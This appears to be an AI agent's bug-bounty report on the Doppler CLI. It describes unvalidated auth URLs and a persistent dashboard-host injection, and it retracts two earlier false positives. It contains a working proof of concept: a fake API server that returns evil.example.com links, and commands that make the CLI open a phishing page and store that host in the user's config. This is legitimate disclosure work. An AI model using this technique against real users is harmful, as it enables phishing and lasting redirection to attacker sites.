# Quick Scan Report: Doppler — 2026-10-17

**Date**: 2026-10-17
**Target**: Doppler (HackerOne, score 66)
**Assets reviewed**: `github.com/DopplerHQ/cli` (Go), `github.com/DopplerHQ/mcp-server` (TS), `api.doppler.com`
**Skills**: code-review-pygo, web-security, api-testing
**Duration**: ~25 min
**Analyst**: agent3

---

## Executive Summary

Resumed the recurring Doppler target. Re-cloned current `main` for the CLI (Go 1.26.9) and MCP server and re-verified the code paths behind prior findings. One **confirmed, still-present** URL-validation flaw is reported below (unvalidated server-supplied URLs in the auth flow, with a persistent `dashboard-host` injection sink). Two prior "Medium" claims were found to be **false positives** and are corrected at the end so they are not re-reported.

---

## Finding 1 — Unvalidated server-supplied URLs in auth flow (CWE-601 / CWE-20)

**Severity**: Medium (client-side; requires attacker-controlled API endpoint or MITM)
**CVSS**: ~6.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
**Component**: Doppler CLI (all versions through current `main`, commit `de0cd29`)
**Classification**: Real bug (missing validation that should exist), not by design

### Description

The CLI trusts two URLs returned by the API and uses them without validating the scheme or host:

1. `auth_url` is opened directly in the browser during `doppler login` (`pkg/cmd/login.go:103`).
2. `dashboard_url` is persisted verbatim into the user's config as `dashboard-host` (`pkg/cmd/login.go:163-172`, same pattern in `pkg/cmd/oidc.go:83-92`), and later launched by `doppler open` (`pkg/controllers/open.go:28-39`).

There is no allow-list check that the returned URL belongs to `*.doppler.com`, no scheme check (so `javascript:`/`file:` are passed to the OS opener), and no host check. An attacker who controls the API response — via the documented `--api-host`/`DOPPLER_API_HOST` override, a poisoned local config, or a MITM against the auth endpoint — can redirect the user's browser during login and **persistently** plant an arbitrary `dashboard-host` that every subsequent `doppler open` will launch. This is an escalation over a one-shot redirect: the malicious host survives in `~/.doppler/.doppler.yaml` across sessions.

### Vulnerable code (current `main`)

`pkg/cmd/login.go`
```go
authURL, ok := response["auth_url"].(string)
// ... no validation of authURL ...
if openBrowser {
    if err := open.Run(authURL); err != nil { ... }   // line 103
}
utils.Print(fmt.Sprintf("Complete authorization at %s", authURL))

// ... later, unvalidated dashboard host persisted to config ...
dashboard, ok := response["dashboard_url"].(string)   // line 163
options := map[string]string{
    models.ConfigToken.String():         token,
    models.ConfigAPIHost.String():       localConfig.APIHost.Value,
    models.ConfigDashboardHost.String(): dashboard,   // line 172  <-- persisted
}
configuration.Set(configuration.Scope, options)
```

`pkg/controllers/open.go`
```go
url := options.DashboardHost.Value                    // attacker-controlled
...
url = url + fmt.Sprintf("/workplace/projects/%s/configs/%s", project, config)  // also unescaped
err := open.Run(url)
```

`pkg/http/api.go:49-72` returns the raw decoded JSON map with no schema validation, so any string is accepted.

### PoC (minimal, local)

```bash
# 1. Attacker-controlled API that mimics /v3/auth/cli/generate/2
cat > /tmp/evil-api.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/v3/auth/cli/generate/2"):
            self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers()
            self.wfile.write(json.dumps({
                "code": "ABCDEF123456",
                "polling_code": "POLLXYZ",
                "auth_url": "https://evil.example.com/doppler-login",
                "dashboard_url": "https://evil.example.com"   # persisted as dashboard-host
            }).encode())
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers()
        self.wfile.write(json.dumps({
            "token": "dp.st.fake", "name": "victim",
            "dashboard_url": "https://evil.example.com"
        }).encode())
HTTPServer(("127.0.0.1", 8443), H).serve_forever()
PY
python3 /tmp/evil-api.py &

# 2. Victim is induced to log in against the attacker host
doppler login --api-host http://127.0.0.1:8443 --yes --no-copy
#   -> browser opens https://evil.example.com/doppler-login  (phishing)
#   -> config now contains dashboard-host: https://evil.example.com

# 3. Persistence: any later open command launches the attacker host
doppler open          # -> https://evil.example.com/workplace/projects/.../configs/...
```

Step 3 is the novel part relative to prior reports: the redirect is *stored*, not transient.

### Impact

- Credential theft via a convincing phishing page opened by a trusted CLI prompt.
- Persistent redirect: every future `doppler open` sends the user to the attacker host (brand/token-harvesting foothold).
- Scheme smuggling (`javascript:`, `file:`) is passed unchecked to the OS handler.

### Remediation

Validate both URLs before use, e.g.:
```go
func isDopplerURL(raw string) bool {
    u, err := url.Parse(raw)
    if err != nil || (u.Scheme != "https" && u.Scheme != "http") {
        return false
    }
    h := strings.ToLower(u.Hostname())
    return h == "doppler.com" || strings.HasSuffix(h, ".doppler.com")
}
// auth_url: reject if !isDopplerURL(authURL)
// dashboard_url: only persist when isDopplerURL(dashboard); otherwise keep the default
```
Also `url.PathEscape` the project/config segments in `open.go`, and consider pinning the default API host.

### Expected vendor response

Likely **Discuss/close as informational** if framed as "requires custom API host." Frame it around the *persistent* `dashboard-host` injection and the missing scheme validation to raise reportability. The precondition (API-host override) is a real, documented feature, so this sits at the Low/Medium boundary.

---

## Corrections to prior reports (avoid re-submitting false positives)

1. **"Redirect token leak" (`reports/doppler-redirect-token-leak.md`) is a false positive.** Go's `net/http` client strips `Authorization`, `Cookie`, `Cookie2`, and `WWW-Authenticate` on redirects to a different host/domain (behavior since Go 1.8, `shouldCopyHeaderOnRedirect`). A cross-host 3xx from the Doppler API does **not** forward the Bearer token. The client using the default redirect policy is not, by itself, a token-leak vulnerability.

2. **"Poisoned `doppler.yaml` with `api-host`/`verify-tls`" (`reports/codereview-doppler-api-host-redirect.md`) is inaccurate.** The repo-level `doppler.yaml` is parsed as `models.MultiRepoConfig`, whose `Setup` entries only carry `path`, `project`, and `config` (`pkg/controllers/repo_config.go`, `pkg/models`). It **cannot** set `api-host`, `token`, or `verify-tls`. Only the user's own `~/.doppler/.doppler.yaml` can, which requires local write access.

---

## Low observations (not submitted)

- **Incomplete dangerous-secret-name warning list** (`pkg/controllers/secrets.go:42-66`): `BASH_ENV`, `ENV`, `CDPATH`, `PS4` are not listed, and `PrepareSecrets` only strips `PATH`/`PS1`/`HOME`. The check is warning-only, so this is a completeness gap, not a control bypass — requires the ability to already write secrets.
- **No response-body size limit** in `performRequest` (`pkg/http/http.go:349`) — DoS only under a malicious/MITM API host.

---

## Methodology

1. Cloned current `main` of `DopplerHQ/cli` and `DopplerHQ/mcp-server`; reviewed auth (`login.go`, `oidc.go`), config/scope (`configuration/config.go`), HTTP client (`http/http.go`, `api.go`), fallback/crypto (`crypto/aes.go`, `controllers/fallback.go`), update (`controllers/update.go`), and the MCP generator/scope/token-cache.
2. Live unauthenticated API probes: `/v3/{workplace,projects,configs}` → 401; `/v3/auth/cli/generate/2` → 200 with the standard `auth_url`; tested 10 common open-redirect params (`redirect_uri`, `next`, `dashboard_url`, `host`, ...) against the generate endpoint — **no server-side open redirect**.
3. Confirmed the CLI auth flow continues to open/persist server-supplied URLs without validation.

## Verdict

Doppler's server-side posture remains strong (auth enforced, no server-side open redirect, no info leakage). The single reportable item is the **client-side unvalidated server-supplied URL / persistent dashboard-host injection**. Report with the persistence angle, or hold if the program has already scoped custom-API-host issues as by-design.

---

*Generated 2026-10-17 by agent3 — quick scan. No agent1 memory was read or modified.*
